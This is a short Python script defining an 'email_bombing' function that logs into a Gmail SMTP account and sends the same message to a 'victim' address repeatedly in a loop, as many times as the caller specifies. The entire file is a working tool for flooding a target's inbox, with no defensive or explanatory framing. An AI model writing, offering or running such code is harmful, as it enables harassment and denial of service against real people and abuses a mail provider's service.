import smtplib
import time



def email_bombing(victime_email, email, password, message, message_relode):

    mail = smtplib.SMTP('smtp.gmail.com',587)
    mail.ehlo()
    mail.starttls()
    mail.login(email,password)

    for x in range(0, message_relode):
        mail.sendmail(email,victime_email,message)
        time.sleep(1)

    mail.close()

    return "successfull {} Emails Send to {}".format(message_relode, victime_email)